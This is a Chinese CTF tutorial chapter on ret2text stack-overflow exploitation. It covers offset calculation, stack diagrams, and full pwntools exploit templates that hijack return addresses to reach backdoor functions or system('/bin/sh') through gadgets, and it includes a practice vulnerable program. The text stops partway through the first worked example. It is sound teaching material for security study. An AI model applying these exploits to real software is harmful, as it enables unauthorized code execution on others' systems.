# 02 ret2text

> 本系列总目录见 [README.md](README.md) ｜ 上一章：[01-基础知识与工具链](01-基础知识与工具链.md) ｜ 下一章：[03-ret2shellcode](03-ret2shellcode.md)

## 本章速览

| 项目 | 内容 |
|------|------|
| **适用场景** | 程序自身 .text 段中已存在可利用代码：backdoor()/get_shell()、system 调用（哪怕参数不是 /bin/sh）、cat flag，或可复用的比较/赋值/传参代码片段 |
| **利用本质** | 用栈溢出覆盖函数返回地址，让 `ret` 把控制流带回程序自己的代码，全程不注入代码、不借外部 libc |
| **前置条件** | ① 存在能控制返回地址的溢出点；② 无 canary（或可泄露，见 08 章）；③ 目标地址已知（No PIE 最省心，PIE 可爆破，见 10.2）；④ .text 里存在值得跳的目标 |
| **难度星级** | ★☆☆☆☆ ～ ★★☆☆☆（PWN 入门第一课，必须练到肌肉记忆） |
| **前置知识** | x86/x64 栈帧结构、调用约定、pwntools 基础（均见 01 章） |
| **常用工具** | gdb + pwndbg、IDA、objdump、strings、ROPgadget、pwntools |

一句话记住它：**ret2text = return to .text。代码不用我带，程序自己带着；我要做的只是把"函数返回后去哪"改成"程序里那句能 getshell 的代码"。**

---

## 1. ret2text 定义与本质

### 1.1 定义

ret2text 是所有基于"返回地址劫持"的利用手法中最简单的一种，名字拆开看就是全部含义：

- **ret**（return）：控制流最终经由函数收尾的 `leave; ret` 回到"返回地址"所指向的地方；
- **2** = to，跳转到；
- **text**：程序的 `.text` 段（代码段），即编译进可执行文件、随程序分发的机器码。

也就是说：**不注入任何代码（区别于 ret2shellcode）、不借用外部 libc 的符号（区别于 ret2libc），只把返回地址改成程序自身 .text 中的某条指令地址**，让程序"跳回自己身上"，走到那段本来就能拿到 shell / flag 的代码。

### 1.2 本质：一次对返回地址的"偷天换日"

函数的 `ret` 指令只做一件事：把栈顶的 4 字节（32 位）/ 8 字节（64 位）弹进 eip/rip，**弹上去什么值就跳哪里**。栈溢出恰好让我们能改写栈上这几个字节，于是"函数返回后去哪"完全由 payload 决定：

```
正常执行流：
main ──call──> vuln() ──ret──> 回到 main 继续执行
                      ↑
                 返回地址 = main 里 call vuln 的下一条指令

溢出后执行流：
main ──call──> vuln() ──ret──> backdoor() ──> system("/bin/sh") ──> shell
                      ↑
              这里已被 payload 覆盖
```

### 1.3 "现成代码"从哪来：backdoor 的三种来源

1. **出题人故意埋的后门**：源码里就写着 `win()` / `backdoor()` / `get_shell()` / `hidden()`，但 main 及其调用链永远不会执行它 —— 典型的"死代码"，专门等你跳过去；
2. **程序正常功能顺带的**：程序哪怕只调用过 `system("ls")`，`system` 就会出现在 PLT 表里，相关字符串也躺在 .rodata —— 这就给"自己拼参数调用"留下了原料（见第 4 节）；
3. **"半成品"逻辑**：程序里各种 if 检测、比较赋值、参数布置 —— 整个函数走不通，但可以只跳进其中一段"干净片段"（见第 5 节）。

### 1.4 利用条件（四个前提）

1. **有溢出点**：能覆盖到返回地址（gets / read 超长读 / scanf("%s") / strcat 等，详见第 8 节）；
2. **无 canary**：checksec 显示 `Stack: No canary found`。有 canary 也不是死路 —— 可以用格式化字符串泄露后原样填回（见 10.1 与 08 章）；
3. **目标地址可得**：No PIE 时所有 .text 地址固定，直接写死；PIE 时需先泄露基址或爆破低位（见 10.2）；
4. **NX 开着也无所谓**：ret2text 不往栈/堆上放代码，这正是它与 ret2shellcode 的分界线 —— 栈不可执行完全不影响本章手法。

### 1.5 ret2 家族地图（你在这里）

| 手法 | 跳转目标 | 典型前提 | 章节 |
|------|----------|----------|------|
| **ret2text（本章）** | 程序 .text 里的 backdoor / system 调用 / 片段 | 程序自带可利用代码 | 02 |
| ret2shellcode | 栈/堆上自己注入的 shellcode | 有可读可写可执行区域 + 泄露地址 | 03 |
| ret2syscall | .text 里 gadget 拼出的 execve 系统调用 | 静态链接、有 int 0x80 及寄存器 gadget | 04 |
| ret2libc | libc 里的 system / one_gadget | 动态链接、需泄露 libc 基址 | 05 |
| ret2plt / ret2dlresolve | PLT / 延迟绑定机制 | 没有输出函数也能打 | 06 |

后面的章节本质都是"换一个跳转目标，或换一种获得目标地址的方式"，本章把"返回地址劫持"的地基打好，后面全是复用。

### 1.6 快速判断"这题能不能 ret2text"

```bash
$ file ./pwn                                   # 先确认 32 / 64 位、动态/静态链接
$ pwn checksec ./pwn                           # canary？NX？PIE？
$ strings ./pwn | grep -E "bin/sh|flag|cat"    # 有没有敏感字符串
$ objdump -d ./pwn | grep -E "<system|<backdoor|<win|<get_shell|<hidden|<flag"
```

IDA 打开后重点看三处：

- **Functions 窗口**：有没有 main 调用链之外的函数（死代码 = backdoor 嫌疑人）；
- **字符串窗口（Shift+F12）**：`/bin/sh`、`cat flag`、`sh` 等，双击后按 X 看交叉引用，落到哪个函数里；
- **溢出函数伪代码**：gets/read/scanf 的目标 buffer 多大、读取长度多大、差值就是可溢出空间。

---

## 2. 偏移计算全方法

利用 ret2text 的第一步永远是回答同一个问题：**从 buf 起点填多少字节，才刚好填到返回地址？** 这个距离叫偏移（offset）。本节给出四种求法，建议 cyclic 打底、手算复核。

### 2.1 先复习：返回地址到底在栈上哪儿

以 32 位为例，函数被 call 后、进入函数体执行 `push ebp; mov ebp, esp` 之后的栈帧：

```
        低地址（栈向低地址方向生长）
        +----------------------+
        |  局部变量区           | <- ebp - X   （buf 就住在这里）
        |  buf[0..N-1]         |
        +----------------------+ <- ebp
        |  saved ebp（4 字节） |   调用者的 ebp，leave 时弹回
        +----------------------+ <- ebp + 4
        |  返回地址（4 字节）  | ★ ret 时弹进 eip，就是我们要覆盖的槽位
        +----------------------+ <- ebp + 8
        |  （调用者的栈帧……）  |
        高地址
```

关键指令语义（01 章讲过，这里只列结论）：

- `call func`：把下一条指令地址压栈（这就是"返回地址"的来源），再跳 func；
- `leave`：等价于 `mov esp, ebp; pop ebp` —— 收回本帧、恢复调用者 ebp；
- `ret`：把栈顶弹进 eip —— **弹谁跳谁**。

64 位完全同构，只是所有槽位从 4 字节变 8 字节（saved rbp、返回地址都是 8 字节）。

### 2.2 方法一：cyclic + gdb（盲测法，最通用）

思想：喂一串"每个 4/8 字节片段都独一无二"的模式串，程序崩溃后看返回地址被哪个片段顶掉了，反查它距离 buf 起点有多远。

```bash
# 1) 生成 200 字节循环模式
$ pwn cyclic 200 > pat.txt

# 2) 喂给程序，让它崩
$ gdb ./ret2text_1
pwndbg> run < pat.txt
Program received signal SIGSEGV
# 32 位：eip 的值就是顶掉返回地址的模式片段，例如 0x6c616161（即 "laaa"）

# 3) 反查偏移（pwndbg 支持 $eip/$rip/$rsp 等寄存器表达式）
pwndbg> cyclic -l 0x6c616161
Found at offset 36 (little-endian)
```

64 位的差别：`ret` 会把 8 字节模式整段弹进 rip，崩溃值直接查；若 rip 不是模式值（比如程序没崩在 ret，或跳进了合法内存），就看 rsp 指向的 8 字节：

```bash
pwndbg> x/gx $rsp
0x7ffd1234: 0x6161616161616166      # "faaaaaaa"
pwndbg> cyclic -l 0x6161616161616166
Found at offset 40 (little-endian)
```

注意事项：

- 反查值必须是"崩溃点上完整的片段"，32 位看 eip，64 位看 rip 或 `[rsp]`；
- 若程序溢出前还有多轮输入，模式串要喂到出溢出的那一轮；
- cyclic 求出的 offset 就是"buf 起点→返回地址"的距离，直接拿来用；
- metasploit 的 `pattern_create.rb` / `pattern_offset.rb` 是同思想的老工具，**但模式与 pwntools cyclic 不同，反查工具必须配套使用**，不要混搭。

### 2.3 方法二：pwndbg 的 pattern 辅助

较新的 pwndbg 与 pwntools cyclic 深度联动：崩溃时若 rip/rsp 落在模式串里，界面会自动提示 `Cyclic pattern found at offset N`；也可以主动执行 `cyclic -l $rip`、`cyclic -l $rsp`。日常做题装一个 pwndbg，偏移基本是白送的。

### 2.4 方法三：手工数汇编 —— 32 位完整推演

源码（演示用）：

```c
void vuln() {
    char buf[40];
    gets(buf);              // 无长度限制，经典溢出点
}
```

objdump 关键片段（`gcc -m32 -fno-stack-protector` 的典型产物）：

```asm
08049162 <vuln>:
 8049162: 55               push  ebp                ; 保存调用者 ebp
 8049163: 89 e5            mov   ebp, esp           ; 建立本函数栈帧
 8049165: 83 ec 28         sub   esp, 0x28          ; 局部空间开 0x28 = 40 字节
 8049168: 83 ec 0c         sub   esp, 0xc
 804916b: 8d 45 d8         lea   eax, [ebp-0x28]    ; ★ buf 的地址 = ebp - 0x28
 804916e: 50               push  eax
 804916f: e8 ac fe ff ff   call  8048440 <gets>
 8049174: 83 c4 10         add   esp, 0x10
 8049177: 90               nop
 8049178: c9               leave                    ; mov esp,ebp; pop ebp
 8049179: c3               ret                      ; 弹返回地址 → eip
```

栈帧逐字节推算（画出图来数）：

```
        低地址
        +--------------------+ <- ebp-0x28 = buf 起点（溢出源点）
        |  buf[0]            |   第 0 字节
        |  buf[1]            |   第 1 字节
        |   ......           |
        |  buf[39]           |   第 39 字节
        +--------------------+ <- ebp
        |  saved ebp（4B）   |   第 40 ～ 43 字节
        +--------------------+ <- ebp+4
        |  返回地址（4B）    |   第 44 ～ 47 字节 ★ ret 要弹的槽位
        +--------------------+
        |  （调用者栈帧）    |
        高地址
```

结论：**offset = 0x28 + 4 = 44**，即 `payload = b'a'*44 + p32(目标地址)`。

易错点：

- 不要拿 `sub esp` 的总空间或"数组声明大小"想当然，**一律以 `lea` 里的 `[ebp-X]` 为准**（gcc 会因对齐/其他变量多开空间，数组实际位置以 lea 为准）；
- gets 停止后会在输入末尾补一个 `\0`：发送 44 字节填充 + 4 字节地址后，第 49 字节会被写成 `\0`，落在"参数区"，通常无害，但必须心里有数（见第 8 节）；
- 32 位地址按小端打包：`p32(0x08048536)` = `b'\x36\x85\x04\x08'`，内存中低字节在前。

### 2.5 方法三（续）：64 位完整推演

源码：

```c
void vuln() {
    char buf[32];
    read(0, buf, 0x100);        // buf 只有 32 字节，却读 256 字节 → 溢出
}
```

```asm
0000000000401156 <vuln>:
  401156: 55                 push  rbp
  401157: 48 89 e5           mov   rbp, rsp
  40115a: 48 83 ec 20        sub   rsp, 0x20          ; 开 0x20 = 32 字节
  40115e: 48 8d 45 e0        lea   rax, [rbp-0x20]    ; ★ buf = rbp - 0x20
  401162: ba 00 01 00 00     mov   edx, 0x100         ; n = 256
  401167: 48 89 c6           mov   rsi, rax           ; buf
  40116a: bf 00 00 00 00     mov   edi, 0             ; fd = 0
  40116f: e8 cc fe ff ff     call  401040 <read@plt>
  401174: 90                 nop
  401175: c9                 leave
  401176: c3                 ret
```

栈帧逐字节推算：

```
        低地址
        +--------------------+ <- rbp-0x20 = buf 起点
        |  buf[0..31]        |   第 0 ～ 31 字节
        +--------------------+ <- rbp
        |  saved rbp（8B）   |   第 32 ～ 39 字节
        +--------------------+ <- rbp+8
        |  返回地址（8B）    |   第 40 ～ 47 字节 ★
        +--------------------+
        高地址
```

结论：**offset = 0x20 + 8 = 40**。64 位与 32 位算法唯一的差别：saved rbp 是 8 字节。

易错点：

- 64 位地址自带两个高位 `\x00`：`p64(0x401156)` = `b'\x56\x11\x40\x00\x00\x00\x00\x00'`。read 类函数原样写入没问题；gets/scanf 类的特殊性见第 8 节；
- read 不补 `\0`，写多少是多少；
- 调试时 `x/gx $rbp` 一次能看到 saved rbp 和返回地址两个槽位，可用来双重验证手算结果。

万能公式（对绝大多数无优化栈帧成立）：

```
offset = X + W
其中 X = lea 指令里 buf 相对 ebp/rbp 的偏移（buf = rbp - X）
      W = saved ebp/rbp 的宽度（32 位取 4，64 位取 8）
```

### 2.6 方法四：fit()/flat() —— 算好之后让 pwntools 替你摆

fit() 不是"求偏移"的方法，而是"已知偏移后"偷懒的写法：按字典把数据精确摆到 payload 的指定偏移处，其余自动填充。

```python
from pwn import *

payload = fit({36: p32(0x8048536)})
# 生成：36 字节填充 + p32(0x8048536)，等价于 b'a'*36 + p32(...)

payload = fit({36: 0x8048536, 44: 0x804853c}, filler=b'ab', length=100)
# 字典键是相对 payload 开头的偏移；整数会按 context.arch 自动打包
# filler 指定填充字符，length 指定总长 —— 多段 payload 时非常好用

payload = flat({40: [pop_rdi, binsh_addr, ret_g, system_plt]}, filler=b'c', length=200)
# flat 按顺序铺开一整条 ROP 链
```

### 2.7 四种方法对比与实战建议

| 方法 | 优点 | 缺点 | 适用 |
|------|------|------|------|
| cyclic + gdb | 不用读汇编，一招通吃所有栈溢出 | 需要本地能跑 gdb；多轮输入时喂串稍麻烦 | 一切栈溢出 |
| pwndbg 自动识别 | 崩溃即报偏移，零操作 | 依赖插件版本 | 装了 pwndbg 就白嫖 |
| 手工数汇编 | 一次算清、基本功扎实；无需运行程序 | 依赖读汇编能力；gcc 对齐易看错 | 有反汇编结果时用它复核 |
| fit()/flat() | 多段 payload 摆位不手滑 | 不是求偏移的方法 | 偏移已知后的书写工具 |

实战建议：**cyclic 打底，手算复核，两者一致再写 exp**。偏移错了后面全白搭，这个数字值得花 30 秒双重确认。

---
## 3. 情形一：存在现成 getshell 函数（backdoor / get_shell）

这是最理想的局面：程序里躺着一个"进去就 getshell"的函数，比如：

```c
void backdoor() {  system("/bin/sh");  }
void get_shell() { execve("/bin/sh", 0, 0);  }
void win() {  system("cat flag");  }      // 不给 shell 直接给 flag，同理
```

### 3.1 原理与栈布局

我们唯一要做的：把返回地址槽位覆盖成该函数的入口地址。函数不需要任何参数，所以 32/64 位做法完全一样。

```
vuln 返回前的栈布局：

        低地址
        +--------------------+ <- buf 起点
        |   'a' * offset     |   填充（把 buf 和 saved ebp/rbp 全埋掉）
        +--------------------+
        |   saved ebp/rbp    |   被填充覆盖（一般无所谓，见 10.3）
        +--------------------+
        |   返回地址         | ← 覆盖为 p32/p64(backdoor)
        +--------------------+
        高地址

执行流：vuln 的 ret → 弹出 backdoor 地址 → 跳进 backdoor → system("/bin/sh")
```

### 3.2 利用条件

- .text 里存在**不需要任何参数**就能拿 shell/flag 的函数；
- 能拿到地址：No PIE 直接 `elf.symbols['backdoor']`；PIE 先泄基址（10.2）；
- 偏移已知（第 2 节）。

找 backdoor 的常用命令：

```bash
$ objdump -d ./pwn | grep -E "<backdoor|<win|<get_shell|<hidden"
$ nm ./pwn | grep -iE "backdoor|shell|win|flag"      # 未 strip 时
```

IDA 法：Shift+F12 看字符串 `/bin/sh`、`cat flag` → 交叉引用到函数；Functions 窗口找 main 调用链之外的函数。

### 3.3 完整模板（32 位）

```python
from pwn import *

context.arch = 'i386'                      # 声明 32 位：p32 按 4 字节打包
context.log_level = 'info'
elf = ELF('./pwn32')                       # 解析 ELF，自动读符号表
io  = process('./pwn32')                   # 本地；远程改为 remote('ip', port)

backdoor = elf.symbols['backdoor']         # backdoor 入口（IDA/objdump 确认过）
offset   = 0x28 + 4                        # 第 2 节算出的偏移，按题取值

payload  = b'a' * offset                   # 1. 填充到返回地址
payload += p32(backdoor)                   # 2. 覆盖返回地址 → backdoor

io.sendlineafter(b'>', payload)            # 3. 等提示符出现再发，避免时序错乱
io.interactive()                           # 4. 进 shell 后手动交互拿 flag
```

### 3.4 完整模板（64 位）

```python
from pwn import *

context.arch = 'amd64'                     # 声明 64 位：p64 按 8 字节打包
context.log_level = 'info'
elf = ELF('./pwn64')
io  = process('./pwn64')

backdoor = elf.symbols['backdoor']
offset   = 0x20 + 8                        # 64 位：saved rbp 占 8 字节

payload  = b'a' * offset
payload += p64(backdoor)                   # 无参数需求，64 位同样只改返回地址

io.sendafter(b'>', payload)
io.interactive()
```

例题见第 9 节例题 1。

---

## 4. 情形二：有 system，但没有 "/bin/sh"（或字符串在别处）

次一档的局面：程序调用过 system（所以 system 在 PLT/符号表里），但参数不是 `/bin/sh` —— 可能是 `system("ls")`、`system("pause")`，甚至压根找不到能用的字符串。这时要自己**找参数**或**造参数**。

### 4.1 第一步：把 "/bin/sh"（或替代品）找出来

```bash
# 1) strings 全文翻：-tx 顺便给出十六进制偏移
$ strings -tx ./pwn | grep -E "bin/sh|/sh"
# 注意：strings 给的是"文件内偏移"，不是运行时虚拟地址！
#      No PIE 时 .rodata 的 VA 通常要经段映射换算，直接用会错

# 2) ROPgadget 按字符串搜，给出的是 VA，最省心
$ ROPgadget --binary ./pwn --string "/bin/sh"
Strings information
============================================================
0x0000000000404040 : /bin/sh

# 3) "sh" 也能用：system("sh") 同样是 shell
$ ROPgadget --binary ./pwn --string "sh"
$ ROPgadget --binary ./pwn --string "bin/sh"   # 有时会搜到跨字段拼接的巧合串
```

pwntools 等价写法（给的是 VA，可直接用）：

```python
binsh  = next(elf.search(b'/bin/sh\x00'))   # 只搜程序自身，不含 libc
system = elf.plt['system']                  # 动态链接：用 PLT 地址
system = elf.symbols['system']              # 静态链接：直接是函数本体地址
```

### 4.2 找不到字符串？自己写进去

程序往往提供第二块可写区域：bss 里的全局数组（name/msg/input 之类）、或第一次输入的堆块。套路是**两段式输入**：

1. 第一轮：把 `"/bin/sh\x00"` 写进 bss 的 name 数组；
2. 第二轮：栈溢出时把 system 的参数填成 name 的地址。

这个套路与第 6 节"返回 main 再打一次"配合，是 ret2text 的标准组合拳（见例题 2）。

### 4.3 32 位：栈传参，画清栈图

32 位 cdecl 约定：**参数从右往左压栈，紧跟在返回地址之后**。而我们不是 `call system` 进去的，是 `ret` 进去的 —— 没有谁替我们压返回地址，所以要在 payload 里**亲手摆出 system 视角下的完整栈**：

```
vuln 返回后，system 眼中的栈（低地址 → 高地址）：

        低地址
        +----------------------+ <- buf 起点
        |   'a' * offset       |   填充
        +----------------------+
        |   p32(system)        | <- 返回地址位：ret 后 eip = system
        +----------------------+
        |   p32(fake_ret)      | <- system 的"返回地址"（占位，见下）
        +----------------------+
        |   p32(binsh_addr)    | <- system 的第 1 个参数（cdecl 栈传参）
        +----------------------+
        高地址

执行流：vuln ret → eip = system，esp 指向 fake_ret 槽位
        system 内部 ret 时弹出 fake_ret（shell 退出后才用）
        system 取参数：从 esp+4 读 → binsh_addr → system("/bin/sh")
```

fake_ret 的三种填法：

- `0xdeadbeef` 之类的占位值：拿 shell 后程序死活无所谓，最常用；
- `exit` 的地址：shell 退出后进程体面收场；
- `0`：多数情况也能拿 shell（0 只在 shell 退出后才被跳），但见第 11 节坑 2 —— 含 `\x00` 且退出后必崩，不稳妥。

**千万不要漏掉 fake_ret 这 4 字节**：漏了的话 binsh_addr 会顶到"返回地址"位上，参数位落进栈上垃圾，system 执行的就是一串乱码路径。

### 4.4 64 位：寄存器传参，pop rdi; ret

64 位 System V ABI：前 6 个整型参数依次走 rdi、rsi、rdx、rcx、r8、r9。调 system 只需要 **rdi = binsh_addr**。返回地址槽位没法直接塞寄存器，于是用 gadget 当"传参驿马"：

```
payload 落地后的栈（低地址 → 高地址）：

        低地址
        +----------------------+ <- buf 起点
        |   'a' * offset       |
        +----------------------+
        |   p64(pop_rdi_ret)   | <- 返回地址位：ret 先跳到 gadget
        +----------------------+
        |   p64(binsh_addr)    | <- 被 gadget 的 pop 吃进 rdi
        +----------------------+
        |   p64(ret)           | <- 可选：栈对齐垫片（见下）
        +----------------------+
        |   p64(system)        | <- gadget 的 ret 跳到 system
        高地址

逐步执行：
  vuln ret      → eip = pop_rdi_ret，rsp 指向 binsh_addr
  pop rdi       → rdi = binsh_addr，rsp 指向 ret 垫片
  ret（垫片）    → 空跳 8 字节，rsp 指向 system
  ret           → eip = system，rdi 已就位 → system("/bin/sh")
```

找 gadget：

```bash
$ ROPgadget --binary ./pwn | grep ": pop rdi ; ret"
0x000000000040126b : pop rdi ; ret
$ ROPgadget --binary ./pwn | grep -w ": ret$"     # 顺手找条裸 ret 备用（对齐）
```

栈对齐垫片：glibc 的 system 内部（do_system）会用 `movaps` 等 SSE 指令，要求 rsp 16 字节对齐。用 `ret` "裸跳"进 system 时 rsp 对不齐就会当场崩在 movaps。垫片的作用是让 rsp 多弹 8 字节补齐对齐。**拿不准就先不加，崩了看栈里有没有 movaps 再加**（详见第 11 节坑 5 与 07 章）。

### 4.5 完整模板（32 位）

```python
from pwn import *

context.arch = 'i386'
elf = ELF('./pwn32')
io  = process('./pwn32')

system_plt = elf.plt['system']                # system 的 PLT 地址
binsh      = next(elf.search(b'/bin/sh\x00')) # 程序内搜字符串 VA
offset     = 0x48 + 4                         # 按题手算

payload  = b'a' * offset                      # 填充
payload += p32(system_plt)                    # 返回地址 → system
payload += p32(0xdeadbeef)                    # system 的返回地址占位
payload += p32(binsh)                         # 第 1 个参数："/bin/sh" 的地址

io.sendafter(b'>', payload)
io.interactive()
```

### 4.6 完整模板（64 位）

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./pwn64')
io  = process('./pwn64')

system_plt = elf.plt['system']
binsh      = next(elf.search(b'/bin/sh\x00'))
pop_rdi    = 0x40126b                         # ROPgadget 找到的 pop rdi ; ret
ret_g      = 0x40101a                         # 裸 ret，对齐垫片

payload  = b'a' * offset                      # 填充
payload += p64(pop_rdi)                       # 1. 先跳 gadget
payload += p64(binsh)                         # 2. pop 进 rdi
payload += p64(ret_g)                         # 3. 对齐垫片（崩 movaps 才需要）
payload += p64(system_plt)                    # 4. ret 进 system

io.sendafter(b'>', payload)
io.interactive()
```

---

## 5. 情形三：没有现成函数，但有可复用的"代码片段"

再退一步：程序里没有任何完整的 getshell 函数，但**逻辑里藏着"半成品"**。ret2text 的精髓在这一节彻底展开 —— 跳转目标不必是函数开头，可以是**任何一条指令**。

### 5.1 跳过程序中某条指令（绕过永假的判断）

backdoor 开头有一道永远过不去的判断（cmp + jne），那就别跳函数开头，**直接跳到判断之后的第一条指令**：

```asm
win:
    push rbp
    mov  rbp, rsp
    mov  eax, DWORD PTR is_admin    ; is_admin 永远是 0，.bss 里的全局变量
    cmp  eax, 0x1337                ; 想拿 shell 必须等于 0x1337
    jne  fail                       ; ← 永远会跳去 fail
    lea  rax, [rip+0xe56]           ; "/bin/sh"     ★ 从这条开始是"干净片段"
    mov  rdi, rax                   ; 参数自动布置好
    call system                     ; ← 直接 getshell
fail:
    lea  rax, [rip+...]             ; "You are not admin!"
    ...
    call exit
```

跳转目标 = `jne` 之后的 `lea` 那条指令的地址。**注意必须落在指令边界上**（用 objdump/IDA 给出的地址，不要自己"掐半个指令"）。

利用条件：

- 能精确读出目标片段的地址（`objdump -d` / IDA 逐行看）；
- 片段自身能完成参数布置（lea → mov rdi 这类），或你能借溢出/寄存器现状把参数铺好；
- 片段里是 `call system` 这类"自带压栈"的调用 —— 附带好处是栈对齐天然正确（对比 4.4 的裸 ret 进 system）。

### 5.2 跳到关键 call（复用参数布置）

推广 5.1：任何函数里那句 `call system` / `call execve`，只要参数在跳进去之前由程序自己布置好（lea → mov rdi → call），控制流能到 lea 就行。常用于：

- 正常逻辑要求"先通过 A 检查才执行 call"，那就直接跳到 A 检查之后；
- 参数布置在另一个函数里（如某个 init 函数给全局指针赋值），先想办法让它跑一遍，再跳 call。

### 5.3 改写比较源：把"比不赢的"换成"必赢的"

另一类片段复用针对**比较逻辑**。程序常写"输入与 magic 相等才给 flag"，而输入根本不可能相等。如果参与比较的是**栈上的指针变量**，溢出就能把它改掉：

```c
char magic[] = "MAGIC";                 // .data 段，地址固定

int main() {
    char name[16];
    char *cmp = "wrong";                // cmp 是栈上的指针，位置在 name 下方（更高地址处）
    read(0, name, 0x20);                // 溢出 8 字节 → 正好覆盖 cmp 指针
    if (!strcmp(cmp, magic))            // 本意：输入必须等于 "MAGIC"
        win();
}
```

payload = 16 字节填充 + `p32/p64(magic_addr)`：把 cmp 整个改成 magic 自己的地址，于是 `strcmp(magic, magic) == 0` 恒成立。本质是"栈上局部指针变量劫持"，与返回地址劫持同源同法。

---

## 6. 情形四：溢出点在深层函数 —— 返回 main 重新触发

### 6.1 什么时候需要"回 main"

- 溢出可写空间太小，一次 payload 装不下整条利用链（read 只超长一点点）；
- 需要"第一次输入写数据、第二次输入引用它"的两段式（配合 4.2 往 bss 写 /bin/sh）；
- 需要多次触发漏洞（先泄露再利用，与 05 章衔接）。

### 6.2 原理

返回地址不填 backdoor，而填 **main（或漏洞函数的调用者）**，让程序"返回到开头重来一遍"：

```
main ─> level1 ─> level2 ─> level3（read 溢出点）

第一轮 payload（短）：b'a'*offset + p64(main)
    level3 的 ret 直接回到 main 开头 → 程序重新跑 → 再次走到 level3 → 再次 read
第二轮 payload（长）：完整利用链 → getshell
```

栈图（示意）：

```
level3 栈帧                        （第二轮的 main 在更低地址重开，无妨）
低地址
+----------------+
| buf[8]         | <- rbp-0x08
+----------------+
| saved rbp      |
+----------------+
| 返回地址       | → 填 p64(main)：level3 的 ret 直接回 main 开头
+----------------+
高地址
```

### 6.3 模板与注意点

```python
# 第一轮：空间只够覆盖一个地址 → 借返回地址回 main 重新触发
io.sendafter(b'level3:', b'a' * offset + p64(elf.symbols['main']))
# 程序回到 main 重新执行，再次走到 level3 的 read
# 第二轮：完整利用
io.sendafter(b'level3:', b'a' * offset + p64(pop_rdi) + p64(binsh) + p64(system))
```

注意点：

- 每一轮的**偏移不变**（栈帧相对布局由编译产物决定），但**绝对栈地址随重入下移** —— 需要绝对栈地址的技巧每轮要重算；
- main 结尾若是 `exit(0)` 而非 return 也没关系：我们是跳到 main 开头重新执行，不依赖 main "返回"；
- 也可以不回 main、直接返回到"main 里 call 漏洞函数的那条指令"，跳过前置输入流程，按题取舍；
- main 重入时 setvbuf 之类初始化重复执行，通常无害。

---

## 7. 情形五：随机偏移 / 随机栈地址

先分清两个概念，很多初学把它们混为一谈：

- **偏移（offset）**：buf 起点到返回地址的距离 —— 只由编译出的栈帧决定，**与 ASLR 无关，永远固定**。ret2text 的核心只需要它；
- **栈绝对地址**：buf 本身住在哪 —— 受 ASLR 影响每轮都变。只有当 payload 需要"引用栈上数据"时才用到（例如把 "/bin/sh" 写在栈上、再把它的地址传给 system）。

### 7.1 程序打印地址时：直接用

```c
printf("buf is at %p\n", buf);      // 出题人白送的泄露
```

```python
io.recvuntil(b'buf is at ')
buf_addr = int(io.recvline().strip(), 16)     # 解析成整数（注意去 0x 与换行）

payload  = b'a' * offset
payload += p32(system) + p32(0xdeadbeef) + p32(buf_addr + 0x20)
# 假设我们已把 "/bin/sh" 写在 buf+0x20 处，把它的真实地址传给 system
```

### 7.2 没有打印时的思路概述

本篇不展开，给方向（后续章节详讲）：

- **本地关 ASLR 只为调试**：`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`，本地栈地址固定便于分析；远程关不了，仅作调试手段；
- **格式化字符串漏洞泄露栈内容**（08 章）：`%p` 连打或 `%n$p` 定点取；
- **泄露 libc 后借 environ 拿栈地址**（05 章）；
- **爆破低位**：ASLR 下栈地址低 12 位（页内）不变，倒数第二字节半随机，1/16 概率可爆破（见 10.2）；
- **环境变量/argv 布置数据**配合栈喷射：老套路，现代题少见。

---

## 8. 输入函数差异：payload 能不能"完整落地"

同一个 payload，换一种输入函数可能直接被截断。写 exp 前必须对号入座：

| 输入函数 | 读取上限 | 停止条件 | 末尾补 \0 | 分隔符去向 | payload 禁用字节 |
|----------|----------|----------|-----------|------------|------------------|
| `gets(buf)` | 无上限 | 读到 `\n` 或 EOF | 是（写在输入之后） | `\n` 被取走并丢弃 | `\n`(0x0a) |
| `fgets(buf, n, stdin)` | n-1 字节 | `\n`、EOF、读满 n-1 | 是 | **`\n` 保留在 buf 里** | `\n` 会占 1 字节位置 |
| `scanf("%s", buf)` | 无上限 | 任意空白符 | 是 | 分隔它的空白被消费；**结尾空白留在输入流里** | 0x20 0x09 0x0a 0x0b 0x0c 0x0d |
| `read(0, buf, n)` | n 字节 | 读满 n 或 EOF | **否** | `\n` 是普通数据，原样写入 | 无 |

要点展开：

1. **gets**：payload 里不能有 `\n`，否则提前截断；`\x00` 没问题（gets 不因它停）。停止后补的 `\0` 会落在"payload 末尾 + 1"的位置 —— 若 payload 长度算得刚好，`\0` 可能砸进 saved ebp 或参数区，注意安排；
2. **scanf("%s")**：payload 里不能有任何空白字节（0x20、0x09、0x0a-0x0d），`\x00` 可以。结尾的空白（通常是 sendline 的 `\n`）会留在流里，被下一轮输入函数先吃到 —— 多轮交互时用 `sendafter`/`recvuntil` 对齐时序；
3. **fgets**：`\n` 会被写进 buf（占 1 字节），随后补 `\0`（再占 1 字节）。组 payload 时给这两个字节留好位置 —— 让它们落在无害的填充区或参数区，并保证 `payload + \n + \0 ≤ n-1`；
4. **read**：最"干净"，原样落地、不补任何东西。注意 socket 下一次 read 不保证读满，pwntools 的 `send` 会全量发送，但程序侧若单次 read 而数据分片到达，可能读到半截 —— 大 payload 遇到"只生效一半"先怀疑这个；
5. **64 位地址的 `\x00` 问题**：`p64(0x40126b)` = `b'\x6b\x12\x40\x00\x00\x00\x00\x00'`，自带 5 个 `\x00`。read 类全量写入没问题；gets/scanf 也不因 `\x00` 停；**真正会截断的是程序把你的输入再过一道字符串处理**（strcpy/strlen/printf("%s")），`\x00` 之后全部作废；
6. **经典省字节技巧**：输入函数是 gets/scanf("%s")（停止后补 `\0`、且 `\n` 不入 buf）时，64 位地址可以**只发低 6 字节** —— 函数自己补的 `\0` 占第 7 字节，第 8 字节沿用栈上原本的 0x00（非 PIE 的 0x40xxxx 返回地址高位本来就是 0）。fgets 不适用（`\n` 会入 buf）。

---
## 9. 典型例题精讲

四道例题对应四种最经典的出题情境，每道给出：关键伪 C 代码、file 与 checksec 输出、解题思路、手算偏移过程、完整可运行 exp。

---

### 例题 1：最简单的 backdoor 直跳（32 位）

#### 题面

```c
// ret2text_1.c —— 编译：gcc -m32 -no-pie -fno-stack-protector ret2text_1.c -o ret2text_1
#include <stdio.h>
#include <stdlib.h>

void backdoor() {                 // main 从不调用它：出题人埋的后门
    system("/bin/sh");
}

int main() {
    char buf[32];
    setvbuf(stdout, 0, 2, 0);
    puts("Welcome to ret2text!");
    gets(buf);                    // 危险函数，无长度限制
    return 0;
}
```

#### file 与 checksec

```
$ file ret2text_1
